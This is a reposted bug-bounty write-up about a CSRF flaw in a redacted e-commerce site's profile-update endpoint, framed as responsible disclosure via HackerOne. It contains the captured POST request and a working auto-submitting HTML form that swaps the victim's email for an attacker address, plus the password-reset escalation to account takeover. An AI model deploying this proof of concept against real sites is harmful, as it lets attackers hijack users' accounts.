# :globe_with_meridians: How I Was Able to Takeover User Accounts via CSRF on an E-Commerce Website

> **Original Source:** [How I Was Able to Takeover User Accounts via CSRF on an E-Commerce Website](https://infosecwriteups.com/how-i-was-able-to-takeover-user-accounts-via-csrf-on-an-e-commerce-website-1e2dcf740c3d)
> **Platform:** infosecwriteups.com | **Category:** `WEB`

---

## The Bug


The target is an E-commerce website from United States. Like most E-Commerce websites, this website provided a feature edit profile on customer’s account. I can’t disclose the name of the website, so let’s call it as redacted.com :)


## Get Crisdeo Nuel Siahaan’s stories in your inbox


Join Medium for free to get updates from this writer.


Remember me for faster sign in


First, I created a dummy victim account and filled in the details.


*victimemail@gmail.com*


During my testing of updating a user profile using Burp Suite, I noticed that the server uses a POST request to send the updated information and there is no protection against CSRF in place. The profile update request appears as follows:


```
POST /secure/profile/profile_form_handler.php HTTP/2
Host: redacted.com
Cookie: <user_cookies_goes_here>
User-Agent: Mozilla/5.0 (Windows VT 10.0; Win64; x64, rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: grip, deflate
Content-Type: application/x-www-form-urlencoded, charset=UTF-8
X-Requested-With: XMLMttpRequest
Content-Length: 231
Origin: redacted.com
Referer: https://redacted.com/secure/profile/profile
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

nextpage=%2Fsecure%2Fprofile%2Fupdated_profile&prevpage=%2Fsecure%2Fprofile%2Fprofile&fromea=&selectedRadialValue=790&txtEmail=victimemail%40gmail.com& txtFirstName=victim&txtLastName=victim&txtDayPhone=12345678&hdnSmsPhone=12345678
```


Now, I copied this CSRF POC from [https://hackerone.com/reports/834366](https://hackerone.com/reports/834366) , modify the data, and saved it as an html page. Here’s my POC:


```
<!DOCTYPE html>
<html>
<body>
<form action="https://redacted.com/secure/profile/profile_form_handler.php" method="POST">
<input type="hidden" name="nextpage" value="%2Fsecure%2Fprofile%2Fupdated_profile"/>
<input type="hidden" name="prevpage" value="%2Fsecure%2Fprofile%2Fprofile"/>
<input type="hidden" name="selectedRadialValue" value="790"/>
<input type="hidden" name="txtEmail" value="lybybyte@mailo.icu"/>
<input type="hidden" name="txtFirstName" value="hacked"/>
<input type="hidden" name="txtLastName" value="hacked"/>
<input type="hidden" name="txtDayPhone" value="999999999"/>
<input type="hidden" name="hdnSmsPhone" value="999999999"/>
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
```


Then I opened the POC in a victim’s browser, and it displayed a “success” response. Upon re-visiting the redacted.com profile page, I observed that the attacker had successfully updated the victim’s profile.


*Response Success*


*Just one click from the victim and the victim profile is entirely updated*


Jackpot! Just one click from the victim and the victim profile is entirely updated. At this point, the integrity aspect of the user has been compromised, but can we do further?

## Escalation


As victim’s email has been replaced, how to escalate this into account takeover? Yep, forgot password!


Next, I opened a incognito browser window to assume the role of the attacker. I visited the redacted.com login page and clicked on the “forgot password” link. Knowing that the victim’s email was changed to “lybybyte@mailo.icu” that the attacker have access to it, I requested for the password reset link to be sent to that email.

*forgot password with attacker’s email attached to victim’s account*


A password reset link was then sent to the attacker’s email. I opened the link, entered a new password, and that was it. I was able to take over the victim’s account without ever having access to their original email or password :)


I immediately reported this vulnerability to the concerned enterprise through its Public Vulnerability Disclosure Program on Hackerone.


Thank you for reading this article :)
Stay Curious!

## Key Takeaway


- Verify the presence of a CSRF token in all sensitive API requests using Burp Suite.

## Timeline


30 Jun 2022 : Bug was discovered.


1 Jul 2022 : Bug was reported to Hackerone public program.


1 Jul 2022 : Bug Status Triaged as High Severity.


27 Oct 2022 : Bug fixed (ineligible for bounty).

---

*Originally published on [Medium](https://infosecwriteups.com/how-i-was-able-to-takeover-user-accounts-via-csrf-on-an-e-commerce-website-1e2dcf740c3d). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of web CTF writeups.*
